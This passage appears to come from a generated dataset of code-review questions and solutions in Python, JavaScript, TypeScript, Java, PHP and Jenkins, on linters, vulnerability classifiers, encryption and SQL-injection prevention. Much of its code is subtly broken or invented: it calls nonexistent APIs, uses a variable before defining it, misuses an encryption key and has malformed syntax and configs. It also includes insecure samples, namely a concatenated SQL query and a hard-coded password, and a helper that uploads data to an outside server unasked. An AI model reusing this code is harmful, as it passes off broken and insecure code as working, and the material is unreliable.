classification system that accurately identifies the complexity, maintainability, and potential bugs in a given code snippet using advanced natural language processing (NLP) techniques and static code analysis. The system should provide a detailed report with suggestions for improvement.\n\nConcept: Natural Language Processing, Static Code Analysis\n\nSolution:\nPython code using spaCy and PyCodestyle libraries:\n\n```python\nimport spacy\nimport pycodestyle\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\nfrom code_analysis_helper import preprocess_code, extract_syntax_features, analyze Maintainability\n\n# Load NLP model\nnlp = spacy.load(\"en_core_web_sm\")\n\n# Preprocess code snippets\ncode_snippets = [\"def complex_function(a, b, c):\", \"if a < b and c > 0:\", \"...\")\npreprocessed_snippets = [preprocess_code(snippet) for snippet in code_snippets]\n\n# Extract syntax features and convert to vector representation\nsyntax_features = [extract_syntax_features(snippet) for snippet in preprocessed_snippets]\nvectorizer = TfidfVectorizer()\nX = vectorizer.fit_transform(syntax_features)\n\n# Load the trained classification model\nclf = MultinomialNB.load(\"complexity_classifier.pkl\")\n\n# Classify code snippets\ncomplexity_scores = clf.predict_proba(X)\n\n# Analyze maintainability\nmaintainability_scores = [analyze Maintainability(snippet) for snippet in code_snippets]\n\n# Identify potential bugs using static code analysis\nbug_reports = [pycodestyle.check_file(f\"temp_file_{i}.py\") for i, snippet in enumerate(code_snippets)]\n\n# Generate detailed report\nfor i, (complexity, maintainability, bugs) in enumerate(zip(complexity_scores, maintainability_scores, bug_reports)):\n    print(f\"Code Snippet {i+1}:\\nComplexity: {complexity[1]}, Maintainability: {maintainability}, Bugs: {bugs}\")\n```\n\nQuestion 2:\nProblem: Create a machine learning model that predicts the likelihood of a code snippet being vulnerable to a specific set of common software vulnerabilities, such as SQL injection, cross-site scripting (XSS), and buffer overflows. The model should be able to handle multiple programming languages and provide granular vulnerability types.\n\nConcept: Machine Learning, Natural Language Processing, Code Analysis\n\nSolution:\nPython code using TensorFlow, BERT, and SonarQube API:\n\n```python\nimport tensorflow as tf\nfrom transformers import BertTokenizer, TFBertForSequenceClassification\nfrom sonarqube_api import get_code_vulnerabilities\nfrom code_analysis_helper import preprocess_code, encode_code\n\n# Load pre-trained BERT model and tokenizer\ntokenizer = BertTokenizer.from_pretrained(\"bert-base-uncased\")\nmodel = TFBertForSequenceClassification.from_pretrained(\"bert-base-uncased\", num_labels=len(vulnerability_types))\n\n# Preprocess code snippets and encode them\ncode_snippets = [\"SELECT * FROM users WHERE username = '\" + user_input + \"';\", ...]\nencoded_snippets = [encode_code(tokenizer, snippet) for snippet in code_snippets]\n\n# Pad and create input datasets\ninput_ids, attention_masks = zip(*encoded_snippets)\ninput_ids = tf.keras.preprocessing.sequence.pad_sequences(input_ids, maxlen=512, dtype=\"long\", truncating=\"post\", padding=\"post\")\nattention_masks = tf.keras.preprocessing.sequence.pad_sequences(attention_masks, maxlen=512, value=0.0, dtype=\"float\", truncating=\"post\", padding=\"post\")\n\n# Predict vulnerability probabilities\nprobabilities = model.predict([input_ids, attention_masks])[0]\n\n# Get vulnerability types andSonarQube analysis\nvulnerability_types = [\"SQL Injection\", \"XSS\", \"Buffer Overflow\", ...]\nsonar_vulnerabilities = [get_code_vulnerabilities(snippet) for snippet in code_snippets]\n\n# Combine predictions and SonarQube analysis\nresults = []\nfor i, (prob, sonar_vuln) in enumerate(zip(probabilities, sonar_vulnerabilities)):\n    result = {\"Code Snippet\": code_snippets[i], \"Predicted Vulnerabilities\": {type: prob[j] for j, type in enumerate(vulnerability_types)}, \"SonarQube Vulnerabilities\": sonar_vuln}\n    results.append(result)\n\n# Generate report\nfor result in results:\n    print(f\"Code Snippet:\\n{result['Code Snippet']}\\nPredicted Vulnerabilities: {result['Predicted Vulnerabilities']}\\nSonarQube Vulnerabilities: {result['SonarQube Vulnerabilities']}\")\n```\n\nNote: The actual implementation of `preprocess_code`, `extract_syntax_features`, `analyze Maintainability`, `encode_code`, and `get_code_vulnerabilities` functions are not included here, as they would require significant development and integration with external libraries or APIs."}, {"L2_TASK": "Code review", "L3_TASK": "Peer review automation", "Complexity_Level": "medium", "Response": "Question 1: Develop a medium-complexity script that automatically checks for code style consistency using a linter and enforces a specific formatting standard in a Python project.\n\nProblem: Ensuring code style consistency is crucial for maintainability and collaboration in a team. A peer review automation tool that applies a linter, such as `flake8`, and auto-formats the code using `black` can streamline this process.\n\nSolution:\n```python\nimport subprocess\nimport os\nimport sys\n\ndef run_linter(directory):\n    try:\n        linter_output = subprocess.check_output([\"flake8\", \"--config\", \".flake8\", \"--exclude\", \"venv,__pycache__\", \".\"], cwd=directory)\n        print(f\"flake8 output: {linter_output.decode('utf-8')}\")\n        return linter_output.decode('utf-8') == \"\"\n    except subprocess.CalledProcessError as e:\n        print(f\"flake8 returned an error: {e}\")\n        return False\n\ndef auto_format(directory):\n    try:\n        subprocess.call([\"black\", \".\", \"--config\", \".black.toml\", \"--exclude\", \"venv,__pycache__\"], cwd=directory)\n        print(\"Code formatted successfully with black.\")\n    except subprocess.CalledProcessError as e:\n        print(f\"black returned an error: {e}\")\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"Usage: python auto_review.py <project_directory>\")\n        sys.exit(1)\n\n    project_directory = sys.argv[1]\n    if not os.path.isdir(project_directory):\n        print(f\"{project_directory} is not a valid directory.\")\n        sys.exit(1)\n\n    is_lint_clean = run_linter(project_directory)\n    if is_lint_clean:\n        auto_format(project_directory)\n    else:\n        print(\"Please fix the linting issues before formatting.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nConcept: Scripting, Process Management\n\nQuestion 2: Implement a script that verifies if all required unit tests are present for a Java project, considering a minimum code coverage threshold.\n\nProblem: Ensuring adequate unit test coverage is essential for a robust codebase. An automated tool that checks for missing tests and verifies the overall coverage using a tool like `jacoco` can ensure this standard.\n\nSolution:\n```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class TestCoverageChecker {\n\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java TestCoverageChecker <project_directory> <minimum_coverage>\");\n            return;\n        }\n\n        String projectDirectory = args[0];\n        double minimumCoverage = Double.parseDouble(args[1]);\n\n        List<String> sourceFiles = findJavaSourceFiles(projectDirectory);\n        List<String> testFiles = findJavaTestFiles(projectDirectory);\n\n        if (sourceFiles.size() == 0) {\n            System.out.println(\"No Java source files found.\");\n            return;\n        }\n\n        if (testFiles.size() == 0) {\n            System.out.println(\"No Java test files found.\");\n            return;\n        }\n\n        try {\n            double coverage = calculateCodeCoverage(projectDirectory, testFiles);\n            if (coverage < minimumCoverage) {\n                System.out.printf(\"Code coverage is %.2f%%, below the minimum requirement of %.2f%%.\\n\", coverage, minimumCoverage);\n            } else {\n                System.out.printf(\"Code coverage is %.2f%%, meeting the minimum requirement of %.2f%%.\\n\", coverage, minimumCoverage);\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error while calculating code coverage: \" + e.getMessage());\n        }\n    }\n\n    private static List<String> findJavaSourceFiles(String projectDirectory) {\n        List<String> sourceFiles = new ArrayList<>();\n        File directory = new File(projectDirectory);\n        for (File file : directory.listFiles()) {\n            if (file.isFile() && file.getName().endsWith(\".java\") && !file.getName().startsWith(\"Test\")) {\n                sourceFiles.add(file.getAbsolutePath());\n            }\n        }\n        return sourceFiles;\n    }\n\n    private static List<String> findJavaTestFiles(String projectDirectory) {\n        List<String> testFiles = new ArrayList<>();\n        File directory = new File(projectDirectory);\n        for (File file : directory.listFiles()) {\n            if (file.isFile() && file.getName().endsWith(\".java\") && file.getName().startsWith(\"Test\")) {\n                testFiles.add(file.getAbsolutePath());\n            }\n        }\n        return testFiles;\n    }\n\n    private static double calculateCodeCoverage(String projectDirectory, List<String> testFiles) throws IOException {\n        // Implement jacoco code coverage calculation using command line interface\n        // This part is beyond the scope of this example and depends on the Jacoco installation and configuration\n        // Example command: \"jacoco exec -destfile jacoco.exec -classfiles <source_files> <test_files>\"\n        // Process the output and return the coverage percentage\n        return 0.0; // Placeholder value\n    }\n}\n```\n\nConcept: Scripting, Filesystem Interaction, External Tools Integration"}, {"L2_TASK": "Code review", "L3_TASK": "Peer review automation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive peer review automation system that utilizes advanced natural language processing (NLP) and machine learning (ML) techniques to analyze code comments and identify potential issues, including bugs, security vulnerabilities, and code smells. The system should provide ranked suggestions for improvement, integrate with popular code hosting platforms, and adapt its analysis over time based on feedback from developers.\n\n**Concept**: Natural Language Processing, Machine Learning, Code Analysis\n\nSolution:\n\n```python\nimport nltk\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.naive_bayes import MultinomialNB\nfrom sklearn.pipeline import Pipeline\nimport pandas as pd\nfrom github import Github\nfrom code_comment_analysis import CodeCommentDataset, CommentAnalyzer\n\n# Load and preprocess historical code review comments and labels\ndataset = CodeCommentDataset.load()\nX_train, X_test, y_train, y_test = train_test_split(dataset.comments, dataset.labels, test_size=0.2, random_state=42)\n\n# Build an NLP pipeline for classification\nnlp_pipeline = Pipeline([\n    ('vectorizer', TfidfVectorizer(stop_words='english', ngram_range=(1, 3))),\n    ('clf', MultinomialNB())\n])\n\n# Train the model\nnlp_pipeline.fit(X_train, y_train)\n\n# Connect to GitHub API\ngithub = Github('API_KEY')\nrepo = github.get_repo('user/repo')\n\n# Fetch new code review comments\npull_requests = repo.get_pulls(state='open')\nfor pr in pull_requests:\n    for comment in pr.get_comments():\n        text = comment.body\n        analysis = CommentAnalyzer(nlp_pipeline).analyze(text)\n        \n        # Rank suggestions and post comments\n        for issue, score in analysis['issues']:\n            if score > 0.8:  # Threshold for high-confidence suggestions\n                pr.create_issue_comment(f\"Potential issue detected: {issue}\")\n\n# Update model with developer feedback\ndef update_model(feedback):\n    feedback_dataset = CodeCommentDataset.from_feedback(feedback)\n    X_feedback, y_feedback = feedback_dataset.comments, feedback_dataset.labels\n    X_combined = pd.concat([X_train, X_feedback], axis=0)\n    y_combined = pd.concat([y_train, y_feedback], axis=0)\n\n    nlp_pipeline.fit(X_combined, y_combined)\n\n# Save the model periodically for persistence\nnlp_pipeline.save('code_review_model.pkl')\n```\n\nQuestion 2: Implement a peer review automation system that integrates with a continuous integration/continuous delivery (CI/CD) pipeline to automatically detect performance bottlenecks in code changes. The system should simulate load testing, analyze profiling results, and suggest optimization strategies using static code analysis and dynamic analysis techniques.\n\n**Concept**: Continuous Integration, Performance Optimization, Code Profiling\n\nSolution:\n\n```python\nimport os\nimport cProfile\nimport pstats\nimport requests\nfrom load_testing import simulate_load\nfrom code_analysis import StaticAnalyzer, DynamicAnalyzer\n\ndef profile_function(func, *args, **kwargs):\n    profiler = cProfile.Profile()\n    result = profiler.runcall(func, *args, **kwargs)\n    profiler.create_stats()\n    return result, profiler\n\ndef analyze_performance(func, *args, **kwargs):\n    result, profiler = profile_function(func, *args, **kwargs)\n    pstats.Stats(profiler).sort_stats('cumulative').print_stats(20)\n\n    # Upload profiling stats to a remote server for centralized analysis\n    stats_path = 'function_profiling.stats'\n    with open(stats_path, 'w') as f:\n        pstats.Stats(profiler, stream=f).dump_stats()\n    requests.post('http://analysis-server.com/upload', files={'stats': open(stats_path, 'rb')})\n\ndef ci_performance_review(change_set):\n    # Simulate load testing with new code changes\n    simulate_load(change_set)\n\n    # Static code analysis for potential performance issues\n    static_issues = StaticAnalyzer(change_set).analyze()\n\n    # Dynamic analysis using profiling\n    dynamic_issues = []\n    for func in change_set.functions:\n        analyze_performance(func)\n\n    # Return a combined list of issues and optimization suggestions\n    return static_issues + dynamic_issues\n\n# Example usage in a CI/CD pipeline\ndef ci_pipeline():\n    code_changes = fetch_latest_code_changes()  # Retrieve code changes from version control\n    issues = ci_performance_review(code_changes)\n    for issue in issues:\n        report_issue(issue)\n\n# Function to fetch code changes from VCS (e.g., Git)\ndef fetch_latest_code_changes():\n    # Implement code to fetch changes from a remote Git repository\n    pass\n\n# Function to report issues to the development team\ndef report_issue(issue):\n    # Implement code to notify developers and integrate with issue tracking system\n    pass\n```\nThese solutions showcase the use of NLP and machine learning for comment analysis, load testing, code profiling, and static/dynamic code analysis to automate peer review in a complex and challenging setting. The code integrates with popular platforms like GitHub and simulates CI/CD environments."}, {"L2_TASK": "Code review", "L3_TASK": "Static code analysis", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Ensure that all functions have descriptive comments and adhere to a consistent naming convention.\nConcept: Static code analysis\n\nSolution:\nWe can use a static code analysis tool like ESLint for JavaScript. Here's a medium-complexity problem where we want to enforce that all functions have JSDoc comments and follow the camelCase naming convention.\n\n```javascript\n// Inefficient and poorly named function\nfunction calculate_total(prices) {\n  let sum = 0;\n  for (let i = 0; i < prices.length; i++) {\n    sum += prices[i];\n  }\n  return sum;\n}\n\n// Correctly named and documented function\n/**\n * @description Calculates the sum of an array of numbers\n * @param {number[]} numbers - An array of numbers to sum\n * @returns {number} The sum of the input numbers\n */\nfunction calculateSum(numbers) {\n  let sum = 0;\n  for (let i = 0; i < numbers.length; i++) {\n    sum += numbers[i];\n  }\n  return sum;\n}\n\n// ESLint configuration (eslintrc.json)\n{\n  \"rules\": {\n    \"require-jsdoc\": [\"error\", {\n      \"require\": {\n        \"FunctionDeclaration\": true,\n        \"MethodDefinition\": true,\n        \"ClassDeclaration\": false\n      }\n    }],\n    \"camelcase\": \"error\"\n  }\n}\n```\nIn this solution, we have two JavaScript functions with different levels of documentation and naming quality. The ESLint configuration file specifies rules to enforce JSDoc comments for function declarations and MethodDefinition (methods in classes), as well as the camelCase naming convention. Running ESLint on this code will identify the first function as problematic, guiding developers to improve its documentation and name.\n\nQuestion 2:\nProblem: Detect potential security vulnerabilities, such as hard-coded passwords, in the codebase.\nConcept: Static code analysis\n\nSolution:\nWe will use a Python static code analysis tool like Bandit to detect security issues. Here's a medium-complexity problem where we want to find hard-coded passwords and suggest better practices.\n\n```python\n# Insecure code with hard-coded password\ndef authenticate(username, password):\n    if username == 'admin' and password == 'secret123':\n        print(\"Login successful\")\n    else:\n        print(\"Invalid credentials\")\n\n# Secure code using environment variables\nimport os\n\ndef authenticate(username, password):\n    if username == 'admin' and password == os.environ['SECURE_PASSWORD']:\n        print(\"Login successful\")\n    else:\n        print(\"Invalid credentials\")\n\n# Bandit configuration (bandit.yml)\n---\n[settings]\nexclude: tests/\n\n[plugins]\nno_hardcoded_passwords: enabled\n```\nIn this example, the first `authenticate` function contains a hard-coded password, which is a security risk. The second function demonstrates a safer approach by retrieving the password from an environment variable. By running Bandit with the provided configuration, it will detect the hard-coded password in the first function and recommend using a more secure method like environment variables."}, {"L2_TASK": "Code review", "L3_TASK": "Static code analysis", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a static code analysis tool in Python that detects potential security vulnerabilities in a given codebase by identifying incorrect usage of sensitive data handling functions and ensuring appropriate encryption practices are followed.\n\nConcept: \"Static code analysis\"\n\nSolution:\n```python\nimport ast\nimport re\nfrom typing import List, Tuple\n\n\u654f\u611f\u51fd\u6570 = {\"read_file\", \"write_file\", \"process_data\"}\n\u52a0\u5bc6\u51fd\u6570 = {\"encrypt_with_rsa\", \"encrypt_with_aes\"}\n\ndef is_sensitive_call(node: ast.Call) -> bool:\n    if isinstance(node.func, ast.Name) and node.func.id in \u654f\u611f\u51fd\u6570:\n        return True\n    return False\n\ndef find_encryption_usage(node: ast.AST) -> List[Tuple[int, str]]:\n    encryption_calls = []\n    for node in ast.walk(node):\n        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):\n            if node.func.id in \u52a0\u5bc6\u51fd\u6570:\n                encryption_calls.append((node.lineno, node.func.id))\n    return encryption_calls\n\ndef static_code_analysis(code: str) -> dict:\n    tree = ast.parse(code)\n    sensitive_calls = [node.lineno for node in ast.walk(tree) if is_sensitive_call(node)]\n    encryption_usage = find_encryption_usage(tree)\n\n    if not sensitive_calls or not encryption_usage:\n        return {\"result\": \"secure\"}\n    \n    if len(sensitive_calls) > len(encryption_usage):\n        return {\"result\": \"insecure\", \"sensitive_calls\": sensitive_calls, \"encryption_usage\": encryption_usage}\n\n    for call in sensitive_calls:\n        if call not in encryption_usage:\n            return {\"result\": \"insecure\", \"sensitive_calls\": [call], \"encryption_usage\": encryption_usage}\n\n    return {\"result\": \"secure\"}\n\n# Example usage\ncode = \"\"\"\ndef handle_data():\n    data = read_file('data.txt')\n    encrypted_data = encrypt_with_rsa(data)\n    write_file('encrypted_data.txt', encrypted_data)\n\"\"\"\n\nresult = static_code_analysis(code)\nprint(result)\n```\nThis code defines a static code analysis tool that detects usage of sensitive data handling functions and ensures appropriate encryption is applied. It uses the Python Abstract Syntax Tree (AST) module to parse the code and checks for specific function calls. If the number of sensitive calls exceeds the number of encryption calls, the code is considered insecure.\n\nQuestion 2: Implement a static code analysis extension for a linter in TypeScript that identifies potential performance bottlenecks by flagging excessive use of nested loops, recursion, and large O(n^2) time complexity functions.\n\nConcept: \"Static code analysis\"\n\nSolution:\n```typescript\nimport * as ts from 'typescript';\n\nfunction isNestedLoop(node: ts.Node): boolean {\n  if (ts.isForStatement(node) || ts.isForOfStatement(node) || ts.isForInStatement(node)) {\n    const parent = node.parent;\n    return parent && (isNestedLoop(parent) || isConditional(parent) || isLoop(parent));\n  }\n  return false;\n}\n\nfunction isRecursiveCall(node: ts.CallExpression) {\n  const symbol = node.getSymbol();\n  return symbol && symbol.getName() === node.expression.getText();\n}\n\nfunction isLargeTimeComplexityFunction(node: ts.CallExpression) {\n  const functionName = node.expression.getText();\n  const largeComplexityFunctions = ['bubbleSort', 'insertionSort', 'quadraticFunction'];\n  return largeComplexityFunctions.includes(functionName);\n}\n\nfunction isConditional(node: ts.Node): boolean {\n  return (\n    ts.isIfStatement(node) ||\n    ts.isDoStatement(node) ||\n    ts.isWhileStatement(node) ||\n    ts.isCaseClause(node) ||\n    ts.isDefaultClause(node)\n  );\n}\n\nfunction isLoop(node: ts.Node): boolean {\n  return (\n    ts.isForStatement(node) ||\n    ts.isForOfStatement(node) ||\n    ts.isForInStatement(node) ||\n    ts.isWhileStatement(node) ||\n    ts.isDoStatement(node)\n  );\n}\n\nfunction analyzeCode(node: ts.Node): void {\n  if (isNestedLoop(node)) {\n    console.warn('Nested loop detected:', node.pos, node.end);\n  }\n\n  if (isRecursiveCall(node)) {\n    console.warn('Recursive call detected:', node.pos, node.end);\n  }\n\n  if (isLargeTimeComplexityFunction(node)) {\n    console.warn('Large time complexity function detected:', node.pos, node.end);\n  }\n}\n\nfunction traverseNode(node: ts.Node): void {\n  analyzeCode(node);\n  node.forEachChild(traverseNode);\n}\n\nfunction staticCodeAnalysis(sourceFile: ts.SourceFile): void {\n  traverseNode(sourceFile);\n}\n\n// Example usage\nconst source = `function bubbleSort(arr) { ... }\nfunction quadraticFunction(n) { ... }\nbubbleSort(quadraticFunction(array));`;\n\nconst program = ts.createProgram([source], { target: ts.ScriptTarget.ES2015 });\nconst sourceFile = program.getSourceFiles()[0];\nstaticCodeAnalysis(sourceFile);\n```\nThis TypeScript code defines a static code analysis tool that identifies potential performance bottlenecks by flagging nested loops, recursive calls, and large O(n^2) time complexity function calls. The tool leverages the TypeScript compiler API to traverse the Abstract Syntax Tree (AST) and analyze each node. It then logs warnings for detected issues."}, {"L2_TASK": "Code review", "L3_TASK": "Code style enforcement", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: In a team project, developers are using different styles for their code, making it inconsistent and hard to read. You are tasked with implementing a code style enforcement tool that automatically formats the code to adhere to a specific style guide, such as PEP 8 for Python.\n\nSolution:\nConcept: Code Style Enforcement (Linter and Formatter)\n\n```python\n# Install necessary packages\n!pip install autopep8 flake8\n\n# Create a script to format Python code using autopep8\ndef format_code(file_path):\n    import autopep8\n    with open(file_path, 'r') as file:\n        code = file.read()\n    formatted_code = autopep8.fix_code(code)\n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n\n# Create a script to check Python code style using flake8\ndef check_code_style(file_path):\n    import subprocess\n    result = subprocess.run(['flake8', file_path], capture_output=True, text=True)\n    print(result.stdout)\n\n# Example usage\nformat_code('path/to/your/file.py')\ncheck_code_style('path/to/your/file.py')\n```\n\nQuestion 2:\nProblem: A codebase contains a mix of tabs and spaces for indentation, violating the team's chosen coding standard. You need to create a script that converts all tabs to spaces, maintaining a specified number of spaces per tab, in all relevant files.\n\nSolution:\nConcept: Code Style Enforcement (Indentation Conversion)\n\n```python\ndef convert_indentation(file_path, spaces_per_tab=4):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    lines = code.split('\\n')\n\n    for i, line in enumerate(lines):\n        # Replace tabs with spaces\n        lines[i] = line.replace('\\t', ' ' * spaces_per_tab)\n\n    formatted_code = '\\n'.join(lines)\n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n\n# Example usage\nconvert_indentation('path/to/your/file.py', spaces_per_tab=4)\n```\n\nThese scripts enforce code style by automatically formatting and checking Python code against a specified style guide (PEP 8) and converting indentation from tabs to spaces. This ensures consistency and readability across the team's codebase."}, {"L2_TASK": "Code review", "L3_TASK": "Code style enforcement", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a tool that enforces consistent code styling for a custom project using a combination of ESlint, Prettier, and a custom set of rules. The tool should automatically format code, enforce specific naming conventions, and validate imports, exports, and function signatures.\n\nConcept: Code Style Enforcement\n\nSolution:\n```javascript\n// package.json\n{\n  \"name\": \"custom-code-style-enforcer\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"lint\": \"eslint --ext .js,.jsx,.ts,.tsx --cache --fix\",\n    \"format\": \"prettier --write 'src/**/*.{js,jsx,ts,tsx}'\",\n    \"validate\": \"node validate.js\"\n  },\n  \"dependencies\": {\n    \"eslint\": \"^8.23.0\",\n    \"eslint-config-airbnb-typescript-prettier\": \"^20.2.0\",\n    \"eslint-plugin-import\": \"^2.25.3\",\n    \"eslint-plugin-jsx-a11y\": \"^6.5.1\",\n    \"eslint-plugin-react\": \"^7.29.4\",\n    \"prettier\": \"^2.6.2\"\n  }\n}\n\n// .eslintrc.js\nmodule.exports = {\n  root: true,\n  parser: '@typescript-eslint/parser',\n  parserOptions: {\n    ecmaVersion: 2021,\n    sourceType: 'module',\n    tsconfigRootDir: __dirname,\n    project: './tsconfig.json',\n  },\n  extends: [\n    'airbnb-typescript-prettier',\n    'plugin:import/typescript',\n  ],\n  plugins: ['@typescript-eslint'],\n  rules: {\n    'import/extensions': ['error', 'ignorePackages', { js: 'never', jsx: 'never', ts: 'never', tsx: 'never' }],\n    'import/no-unresolved': 'error',\n    'function-paren-newline': ['error', 'consistent'],\n    // Add your custom rules here\n  },\n};\n\n// validate.js\nconst fs = require('fs');\nconst path = require('path');\nconst esprima = require('esprima');\nconst escodegen = require('escodegen');\n\nfunction validateImportsAndExports(fileContent, filePath) {\n  const ast = esprima.parseScript(fileContent, { sourceType: 'module' });\n\n  const invalidImports = [];\n  const invalidExports = [];\n\n  ast.body.forEach(node => {\n    if (node.type === 'ImportDeclaration') {\n      if (!fs.existsSync(path.join(process.cwd(), 'node_modules', node.source.value))) {\n        invalidImports.push(node.source.value);\n      }\n    }\n\n    if (node.type === 'ExportNamedDeclaration') {\n      if (!node.source) {\n        // Local exports\n        const usedBeforeDeclared = node.specifiers.some(specifier => {\n          const declared = ast.body.some(n =>\n            n.type === 'VariableDeclaration' && n.declarations.some(d => d.id.name === specifier.local.name)\n          );\n          return !declared;\n        });\n        if (usedBeforeDeclared) {\n          invalidExports.push(node.specifiers.map(specifier => specifier.local.name).join(', '));\n        }\n      } else {\n        // External exports\n        if (!fs.existsSync(path.join(process.cwd(), node.source.value))) {\n          invalidExports.push(node.source.value);\n        }\n      }\n    }\n  });\n\n  if (invalidImports.length > 0 || invalidExports.length > 0) {\n    console.error(`Invalid imports and exports in ${filePath}:`);\n    if (invalidImports.length > 0) {\n      console.error(`Invalid imports: ${invalidImports.join(', ')}`);\n    }\n    if (invalidExports.length > 0) {\n      console.error(`Invalid exports: ${invalidExports.join(', ')}`);\n    }\n    process.exit(1);\n  }\n}\n\n// Iterate through all source files\nfs.readdirSync('src')\n  .filter(file => ['.js', '.jsx', '.ts', '.tsx'].includes(path.extname(file)))\n  .forEach(file => {\n    const filePath = path.join('src', file);\n    const fileContent = fs.readFileSync(filePath, 'utf-8');\n    validateImportsAndExports(fileContent, filePath);\n  });\n```\nQuestion 2: Implement a continuous integration (CI) pipeline in Jenkins that not only enforces code style guidelines but also generates a detailed style report, including violation counts and examples, for a project using a combination of SonarQube, Checkstyle, and custom Java rules.\n\nConcept: Code Style Enforcement\n\nSolution:\n```yaml\n# Jenkinsfile\npipeline {\n  agent any\n\n  stages {\n    stage('Checkout') {\n      steps {\n        git branch: 'main', url: 'https://github.com/your/repo.git'\n      }\n    }\n\n    stage('Build') {\n      steps {\n        sh 'mvn -B clean package -DskipTests'\n      }\n    }\n\n    stage('Code Style Check') {\n      steps {\n        sh 'mvn -B checkstyle:check'\n      }\n    }\n\n    stage('Static Analysis with SonarQube') {\n      steps {\n        script {\n          def sonarServer = 'http://your-sonarqube-server-url'\n          def sonarToken = 'your-sonarqube-token'\n\n          withSonarQubeEnv(sonarServer, sonarToken) {\n            sh 'mvn sonar:sonar -Dsonar.projectKey=your_project_key -Dsonar.login=$SONAR_TOKEN'\n          }\n        }\n      }\n    }\n\n    stage('Custom Java Rules') {\n      steps {\n        sh 'mvn -B com.github.seanroy:checkstyle-rule-composer:check -Dcomposer.ruleFile=src/main/resources/custom-rules.xml'\n      }\n    }\n\n    stage('Generate Style Report') {\n      steps {\n        script {\n          def report = readJSON file: 'target/checkstyle-result.xml'\n          def violations = report.checkstyle.file.findResults { it.error }.size()\n          def errorExamples = report.checkstyle.file.findAll { it.error }.take(5).collect { it.message }\n\n          echo \"Total violations: ${violations}\"\n          echo \"Error examples:\"\n          errorExamples.each { echo \"\\t- $it\" }\n\n          // Save the report to a file\n          writeFile file: 'style-report.json', text: JSON.prettyPrint([violations: violations, examples: errorExamples])\n        }\n      }\n    }\n  }\n\n  post {\n    always {\n      cleanWs()\n    }\n    success {\n      archive 'style-report.json'\n    }\n  }\n}\n```\nIn this solution, we set up a Jenkins pipeline that performs a series of code style checks using Maven, Checkstyle, SonarQube, and a custom checkstyle rule file. The pipeline generates a detailed style report, including the total number of violations and examples of error messages. The report is saved as a JSON file and archived for further analysis."}, {"L2_TASK": "Code review", "L3_TASK": "Security review integration", "Complexity_Level": "medium", "Response": "Question 1: How can you ensure sensitive data is properly encrypted and decrypted in a Python application during a code review, while also integrating security checks?\n\n**Concept**: Data Encryption, Security Review\n\n**Solution**:\n\nIn a Python application, sensitive data can be encrypted using the `cryptography` library, which provides secure encryption algorithms. Here's an example of encrypting and decrypting a string using AES encryption:\n\n```python\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nimport base64\n\ndef generate_key():\n    return Fernet.generate_key()\n\ndef encrypt_data(plaintext, key):\n    backend = default_backend()\n    iv = backend.random_bytes(Cipher(algorithms.AES(key), modes.CBC(iv)).iv_len)\n    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)\n    encryptor = cipher.encryptor()\n    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()\n    return base64.b64encode(iv + ciphertext).decode()\n\ndef decrypt_data(ciphertext, key):\n    encoded_ciphertext = base64.b64decode(ciphertext)\n    backend = default_backend()\n    iv = encoded_ciphertext[:16]\n    ciphertext = encoded_ciphertext[16:]\n    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)\n    decryptor = cipher.decryptor()\n    plaintext = decryptor.update(ciphertext) + decryptor.finalize()\n    return plaintext.decode()\n\n# During code review, ensure the key generation and storage is secure and not hardcoded.\nkey = generate_key()\nsensitive_data = \"Sensitive information\"\n\nencrypted_data = encrypt_data(sensitive_data, key)\nprint(f\"Encrypted data: {encrypted_data}\")\n\ndecrypted_data = decrypt_data(encrypted_data, key)\nprint(f\"Decrypted data: {decrypted_data}\")\n```\n\nCode review should focus on:\n\n1. Proper key management: Ensure the key is securely stored and not hardcoded in the code.\n2. Use of strong encryption algorithms: AES is a good choice, but ensure the key size and mode of operation are secure.\n3. Handling edge cases: Check for correct padding and error handling during encryption and decryption.\n\nQuestion 2: How can you integrate a security check to ensure SQL injection attacks are prevented in a PHP application during a code review?\n\n**Concept**: SQL Injection Prevention, Security Review\n\n**Solution**:\n\nIn PHP, you can use prepared statements with bound parameters to prevent SQL injection attacks. Here's an example using PDO (PHP Data Objects):\n\n```php\n<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n\n// Create a new PDO instance\ntry {\n    $pdo = new PDO(\"mysql:host=$servername;dbname=$dbname\", $username, $password);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n    // Prepare the SQL statement with placeholders\n    $stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = :username AND password = :password\");\n\n    // Bind the parameters\n    $stmt->bindParam(':username', $username_param);\n    $stmt->bindParam(':password', $password_param);\n\n    // Set the values and execute\n    $username_param = \"testUser\";\n    $password_param = \"testPassword\";\n    $stmt->execute();\n\n    $result = $stmt->fetch(PDO::FETCH_ASSOC);\n    if ($result) {\n        echo \"Login successful!\";\n    } else {\n        echo \"Invalid credentials.\";\n    }\n} catch (PDOException $e) {\n    echo \"Connection failed: \" . $e->getMessage();\n}\n```\n\nDuring code review, ensure the following:\n\n1. Prepared statements are used for all dynamic SQL queries.\n2. Parameters are properly bound to the prepared 